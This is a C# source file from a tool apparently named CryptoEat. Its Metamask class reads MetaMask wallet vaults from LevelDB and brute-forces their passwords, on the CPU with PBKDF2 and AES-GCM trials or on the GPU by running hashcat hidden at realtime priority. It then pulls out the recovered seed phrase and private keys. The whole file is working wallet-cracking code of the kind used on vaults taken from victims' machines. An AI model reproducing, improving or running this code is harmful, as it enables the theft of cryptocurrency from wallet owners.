using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using CryptoEat.Modules.Logs;
using CryptoEat.Modules.Wallet.Libs;
using LevelDB;
using NBitcoin;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Account = Nethereum.Web3.Accounts.Account;

namespace CryptoEat.Modules.Wallet;

internal partial class Metamask : IWallet
{
    internal static readonly Regex RegexSeed = RegexSeed1();
    private readonly byte[]? _bcCiphertext;
    private readonly GcmBlockCipher _cipher = new(new AesEngine());
    private readonly byte[]? _data;
    private readonly string _hash;
    private readonly byte[]? _iv;
    private readonly Regex _pKeyRegex = _pKeyRegex1();
    private readonly Regex _regexSeed2 = _regexSeed21();
    private readonly byte[]? _salt;

    private readonly byte[]? _tag;
    private readonly int _tagLength;

    public Metamask(string walletPath)
    {
        if (!Generic.DEBUG)
        {
            var path = Path.Combine(Generic.TempDir, "CryptoEat", Guid.NewGuid().ToString());
            FileSystem.CopyDirectory(walletPath, path);
            walletPath = path;
        }

        using var options = new Options();
        options.CreateIfMissing = false;
        options.ParanoidChecks = false;
        using var db = new DB(options, walletPath);

        try
        {
            if (!db.GetLdbWallet(out var walletInfo, out var walletType))
                throw new ArgumentException("Incorrect wallet", nameof(walletPath));

            WalletInfo = walletInfo;
            WalletName = walletType;

            var jobj = JObject.Parse(WalletInfo.NormalizedVault);
            _data = Convert.FromBase64String(jobj["data"]?.ToString() ?? "");
            _iv = Convert.FromBase64String(jobj["iv"]?.ToString() ?? "");
            _salt = Convert.FromBase64String(jobj["salt"]?.ToString() ?? "");

            var vaultTemp =
                JsonConvert.DeserializeAnonymousType(WalletInfo.NormalizedVault, new { data = "", iv = "", salt = "" });
            if (vaultTemp != null) _hash = $"$metamask${vaultTemp.salt}${vaultTemp.iv}${vaultTemp.data}";


            _tag = (_data.AsSpan()[^16..].ToArray() ?? throw new InvalidOperationException()).ToArray();
            _tagLength = _tag.Length * 8;
            _data = (_data.AsSpan()[..^16].ToArray() ?? throw new InvalidOperationException()).ToArray();

            _bcCiphertext = _data.Concat(_tag).ToArray();
        }
        catch
        {
            // ignore, close db
        }

        db.Close();
        db.Dispose();
    }

    public WalletInfo? WalletInfo { get; init; }
    public WalletType WalletName { get; init; }

    public bool TryBrute(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        return Generic.Settings.GpuBrute
            ? TryBruteGpu(ref passwords, out mnemo, out password)
            : TryBruteCpu(ref passwords, out mnemo, out password);
    }

    public bool TryBruteCpu(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        var rightPass = string.Empty;
        var isBruted = false;
        var result = string.Empty;
        password = string.Empty;
        mnemo = null;
        if (_salt is null) return false;
        var options = new ParallelOptions { MaxDegreeOfParallelism = passwords.Count > 100 ? 100 : passwords.Count };
        Parallel.ForEach(passwords.Distinct().Where(x => x.Length > 7), options, (pass, state) =>
        {
            if (isBruted) return;
            try
            {
                result = DecryptWithBouncyCastle(
                    Rfc2898DeriveBytes.Pbkdf2(
                        Encoding.UTF8.GetBytes(pass),
                        _salt,
                        10000,
                        HashAlgorithmName.SHA256, 32));
                rightPass = pass;
                isBruted = true;
                state.Stop();
            }
            catch
            {
                // ignored
            }
        });
        if (!isBruted) return false;
        mnemo = GetMnemonic(result);
        password = rightPass;
        return isBruted;
    }


    public bool TryBruteGpu(ref HashSet<string> passwords, out Output? mnemo, out string password)
    {
        foreach (var process in Generic.ChildProcesses)
            try
            {
                process.Kill();
                Generic.ChildProcesses.Remove(process);
            }
            catch
            {
                // ignore
            }

        var tempDir = Path.Combine(Environment.CurrentDirectory, "temp");
        if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

        password = string.Empty;
        mnemo = null;

        foreach (var pr in Process.GetProcessesByName("hashcat.exe")) pr.Kill();

        var passPath = Path.Combine(tempDir, "tempPasswords.txt");
        var hashPath = Path.Combine(tempDir, "hash.txt");
        File.WriteAllLines(passPath, passwords.Distinct().Where(x => x.Length is > 7 and < 100));
        File.WriteAllText(hashPath, _hash);

        var count = passwords.Count;
        passwords.Clear();

        try
        {
            if (File.Exists(Path.Combine("hashcat", "hashcat.potfile")))
                File.Delete(Path.Combine("hashcat", "hashcat.potfile"));
        }
        catch
        {
            // ignored
        }

        try
        {
            if (File.Exists(Path.Combine("hashcat", "cracked.txt")))
                File.Delete(Path.Combine("hashcat", "cracked.txt"));
        }
        catch
        {
            // ignored
        }

        var p = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "hashcat/hashcat.exe",
                Arguments =
                    $"-a 0 {(count > 10000000 ? "-w 4" : "-w 3")} -O -m 26600 --force -o cracked.txt \"{hashPath}\" \"{passPath}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true,
                RedirectStandardInput = true,
                WorkingDirectory = "hashcat"
            }
        };
        p.Start();
        p.PriorityClass = ProcessPriorityClass.RealTime;
        Generic.ChildProcesses.Add(p);

        while (!p.StandardOutput.EndOfStream)
        {
            var standardOutput = p.StandardOutput.ReadLine();
            if (standardOutput?.StartsWith("Status") != true) continue;

            if (standardOutput.Contains("Cracked"))
            {
                var temp = File.ReadAllLines("hashcat/cracked.txt")[0];
                password = temp.Split(':').Last();
                mnemo = GetMnemonic(DecryptWithBouncyCastle(Rfc2898DeriveBytes.Pbkdf2(Encoding.UTF8.GetBytes(password),
                    _salt!,
                    10000,
                    HashAlgorithmName.SHA256, 32)));
                try
                {
                    p.Close();
                    Generic.ChildProcesses.Remove(p);
                }
                catch
                {
                    // ignored
                }

                return true;
            }

            if (!standardOutput.Contains("Exhausted")) continue;

            try
            {
                p.Close();
                Generic.ChildProcesses.Remove(p);
            }
            catch
            {
                // ignored
            }

            return false;
        }

        p.WaitForExit();


        try
        {
            Generic.ChildProcesses.Remove(p);
        }
        catch
        {
            // ignore
        }

        return false;
    }

    private string DecryptWithBouncyCastle(in byte[] key)
    {
        _cipher.Reset();
        _cipher.Init(false, new AeadParameters(new KeyParameter(key), _tagLength, _iv));
        var plaintextBytes = new byte[_data!.Length];
        _cipher.DoFinal(plaintextBytes,
            _cipher.ProcessBytes(_bcCiphertext, 0, _bcCiphertext!.Length, plaintextBytes, 0));

        return Encoding.UTF8.GetString(plaintextBytes);
    }

    private Output GetMnemonic(string rawOutput)
    {
        var output = new Output();

        var mnemo = RegexSeed.Match(rawOutput).Value.Trim(' ');
        if (mnemo.Length >= 10) output.Mnemonic = new Mnemonic(mnemo);
        else
            try
            {
                mnemo = Encoding.UTF8.GetString(_regexSeed2.Match(rawOutput).Groups[1].Value.Split(',')
                    .Select(byte.Parse).ToArray());
                output.Mnemonic = new Mnemonic(mnemo);
            }
            catch (Exception ex)
            {
                Generic.WriteError(ex);
                Generic.WriteError(new ArgumentException(rawOutput));
            }

        #region Private keys

        var matches = _pKeyRegex.Matches(rawOutput);
        if (matches.Count > 0)
            output.Accounts = matches
                .Select(x => new Account(x.Value))
                .ToArray();

        #endregion

        return output;
    }

    [GeneratedRegex(@"([a-zA-Z]{3,15}(,| |\||-|\.|\+)?){12}", RegexOptions.Compiled)]
    private static partial Regex RegexSeed1();
    [GeneratedRegex("[a-f0-9]{64}", RegexOptions.Compiled)]
    private static partial Regex _pKeyRegex1();
    [GeneratedRegex("mnemonic\":\\[([0-9\\,]*)\\]", RegexOptions.Compiled)]
    private static partial Regex _regexSeed21();
}